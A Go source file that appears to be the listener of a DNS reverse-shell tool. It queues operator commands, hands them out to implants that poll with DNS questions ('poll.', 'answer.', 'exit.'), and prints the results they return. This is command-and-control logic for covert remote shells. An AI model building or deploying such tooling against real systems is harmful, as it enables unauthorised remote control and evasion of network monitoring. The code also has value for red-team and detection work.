package listener

import (
	"dns-reverse-shell/main/shell"
	"fmt"
	"github.com/golang-collections/collections/queue"
)

type interactionHandler struct {
	shell *shell.Shell
	queue *queue.Queue
}

func newInteractionHandler() *interactionHandler {
	handler := interactionHandler{}
	handler.queue = queue.New()
	return &handler
}

func (m *interactionHandler) init() {
	m.shell = shell.NewShell(m.queueCommand)
	m.shell.Start()
}

func (m *interactionHandler) queueCommand(command string) {
	m.queue.Enqueue(command)
}

func (m *interactionHandler) handleCommand(receivedQuestion string, answerCallback func() string, exitCallback func()) string {
	//todo: test if this works, before i set a var with the case result and returned it!
	//todo idea: use message type here but cut off "." before
	switch receivedQuestion {
	case "poll.":
		return m.polling()
	case "answer.":
		return m.answer(answerCallback())
	case "exit.":
		m.exit(exitCallback)
	default:
	}
	return "idle"
}

func (m *interactionHandler) polling() string {
	if m.queue.Len() != 0 {
		return m.queue.Dequeue().(string)
	}
	return "idle"
}

func (m *interactionHandler) answer(answer string) string {
	fmt.Println(answer)
	m.shell.Resume()
	return "ok"
}

func (m *interactionHandler) exit(connectionHandlerCallback func()) {
	fmt.Println("Connection closed")
	connectionHandlerCallback()
	m.shell.Start()
}
